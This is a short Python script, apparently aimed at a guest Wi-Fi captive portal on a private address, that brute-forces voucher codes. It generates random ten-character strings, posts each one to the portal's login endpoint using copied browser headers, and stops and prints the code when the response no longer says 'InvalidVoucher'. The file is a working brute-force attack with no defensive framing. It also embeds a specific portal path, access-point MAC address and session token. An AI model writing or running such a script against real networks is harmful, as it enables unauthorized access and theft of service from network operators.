import requests
import time

from string_generator.string_generator import randomize


def request():
    value_list = []

    for _ in range(500000000):
        cookies = {
            'NG_TRANSLATE_LANG_KEY': '%22en%22',
        }

        headers = {
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.46',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'http://172.16.88.10:8880',
            'Referer': 'http://172.16.88.10:8880/guest/s/n44f96xo/?ap=80:2a:a8:c9:99:46&ec=xN7rJExMpWM7hTtqFT_k7bt67ERxFmG9yDLW5WmOQFFONEf0UT4cRK6asMixjPObdPQo6GcEaJY9q36PnIi6Kxn7MAWejvMcw3HBnuhG03Wl9npKkNEHe-PF_0_5CskpeHxHc0GDCvlHxdJOCLaRxFIn24JPaGOAKjJAfL5zKDopzv88FG7h0dktfdz8z9T2',
            'Accept-Language': 'en-US,en;q=0.9',
            # 'Cookie': 'NG_TRANSLATE_LANG_KEY=%22en%22',
        }

        params = {
            't': str(int(time.time())),
        }

        values = randomize(10)
        for val in values:
            if val not in value_list:
                value_list.append(val)
                data = '{"by":"voucher","voucher":"' + val + '"}'
                response = requests.post('http://172.16.88.10:8880/guest/s/n44f96xo/login', headers=headers,
                                         params=params,
                                         cookies=cookies, data=data, verify=False)
                if "InvalidVoucher" in response.text:
                    print(0)
                else:
                    print(val)
                    print(response.text)
                    exit()

    print('Tried ' + str(len(value_list)) + ' requests')
    print(value_list)


if __name__ == '__main__':
    request()
